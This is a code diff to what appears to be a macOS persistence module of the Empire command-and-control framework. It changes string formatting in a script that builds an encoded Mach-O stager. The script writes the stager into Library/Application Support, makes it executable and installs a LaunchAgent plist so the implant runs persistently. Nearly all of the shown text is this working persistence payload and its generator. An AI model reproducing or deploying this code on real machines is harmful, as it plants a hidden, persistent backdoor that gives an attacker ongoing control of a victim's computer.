@@ -2,9 +2,10 @@ import base64
 from typing import Dict, Optional, Tuple
 
 from empire.server.core.module_models import EmpireModule
+from empire.server.utils.string_util import removeprefix, removesuffix
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -25,7 +26,10 @@ class Module(object):
             userAgent=user_agent,
             safeChecks=safe_checks,
         )
-        launcher = launcher.strip("echo").strip(" | python3 &").strip('"')
+        launcher = removeprefix(launcher, "echo ")
+        launcher = removesuffix(launcher, " | python3 &")
+        launcher = launcher.strip('"')
+
         macho_bytes = main_menu.stagers.generate_macho(launcherCode=launcher)
         enc_bytes = base64.b64encode(macho_bytes)
 
@@ -57,43 +61,43 @@ user = os.environ['USER']
 group = 'wheel' if isRoot else 'staff'
 
 launchPath = '/Library/LaunchAgents/' if isRoot else '/Users/'+user+'/Library/LaunchAgents/'
-daemonPath = '/Library/Application Support/%(daemonName)s/' if isRoot else '/Users/'+user+'/Library/Application Support/%(daemonName)s/'
+daemonPath = '/Library/Application Support/{daemonName}/' if isRoot else '/Users/'+user+'/Library/Application Support/{daemonName}/'
 
-encBytes = "%(encBytes)s"
+encBytes = "{encBytes}"
 bytes = base64.b64decode(encBytes)
-plist = \"\"\"%(plistSettings)s
-\"\"\" %% ('%(daemonName)s', daemonPath+'%(programName)s')
+plist = \"\"\"{plistSettings}
+\"\"\" % ('{daemonName}', daemonPath+'{programName}')
 
 if not os.path.exists(daemonPath):
     os.makedirs(daemonPath)
 
-e = open(daemonPath+'%(programName)s','wb')
+e = open(daemonPath+'{programName}','wb')
 e.write(bytes)
 e.close()
 
-os.chmod(daemonPath+'%(programName)s', 0755)
+os.chmod(daemonPath+'{programName}', 0755)
 
-f = open('/tmp/%(plistFilename)s','w')
+f = open('/tmp/{plistFilename}','w')
 f.write(plist)
 f.close()
 
-os.chmod('/tmp/%(plistFilename)s', 0644)
+os.chmod('/tmp/{plistFilename}', 0644)
 
-process = subprocess.Popen('chown '+user+':'+group+' /tmp/%(plistFilename)s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('chown '+user+':'+group+' /tmp/{plistFilename}', stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('mv /tmp/%(plistFilename)s '+launchPath+'%(plistFilename)s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('mv /tmp/{plistFilename} '+launchPath+'{plistFilename}', stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-print("\\n[+] Persistence has been installed: "+launchPath+"%(plistFilename)s")
-print("\\n[+] Empire daemon has been written to "+daemonPath+"%(programName)s")
+print("\\n[+] Persistence has been installed: "+launchPath+"{plistFilename}")
+print("\\n[+] Empire daemon has been written to "+daemonPath+"{programName}")
 
-""" % {
-            "encBytes": enc_bytes,
-            "plistSettings": plistSettings,
-            "daemonName": daemon_name,
-            "programName": program_name,
-            "plistFilename": plist_filename,
-        }
+""".format(
+            encBytes=enc_bytes,
+            plistSettings=plistSettings,
+            daemonName=daemon_name,
+            programName=program_name,
+            plistFilename=plist_filename,
+        )
 
         return script
